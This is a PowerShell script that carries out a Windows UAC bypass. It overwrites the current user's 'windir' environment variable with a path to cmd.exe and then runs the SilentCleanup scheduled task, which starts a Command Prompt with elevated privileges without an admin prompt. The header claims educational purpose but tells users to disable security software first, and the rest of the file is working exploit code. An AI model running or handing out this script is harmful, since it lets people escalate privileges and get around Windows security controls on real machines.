<#
.SYNOPSIS
    The unelevated PowerShell script starts a Command Prompt with elevated privileges.

.DESCRIPTION
    The PowerShell script abuses the Environment Variables feature of Windows Operating System to starts Command Prompt with escalated privileges. It modifies the environment variable "windir" in "HKCU\Environment" to the path of Command Prompt. The script triggers execution of an already available scheduled task which runs with highest privileges in Windows and contains environment variable %windir% in the path of associated action. As the script has modified the environment variable %windir% to the batch script path, it allows execution of the script file with escalated privileges.	

.NOTES
    Author				: Deepak Rajput
    Date				: 2024-08-10
    System Requirement	: Many security software guards against the modification of suspicious registry changes. Any running security software needs to be disabled before testing the script.
    Disclaimer			: The script is created for only educational purpose.
#>

function Test-IsAdmin {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$currentIdentity
    
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (Test-IsAdmin)
{	
	Write-Host "Please run the PowerShell script without admin privilages to see the elevated Command Prompt"
}
else
{
	Write-Host "Running script file as non-admin..."	

	$registryPath = "HKCU:\Environment"
	$Name = "windir"
	
	#In some scenario the path of environmet variables is considered within double quotes and below value can handle path with quotes and without quotes
	$Value = "C:\Windows\system32\cmd.exe `" "
	Write-Host $Value
	#modifying the environment variable for current user
	Set-ItemProperty -Path $registryPath -Name $name -Value $Value

	Start-Sleep -Seconds 2
	schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
	Start-Sleep -Seconds 2
	
	#restoring the environment variable
	Remove-ItemProperty -Path $registryPath -Name $name
	Start-Sleep -Seconds 2

	Write-Host "Elevated Command Prompt has been started..."
}
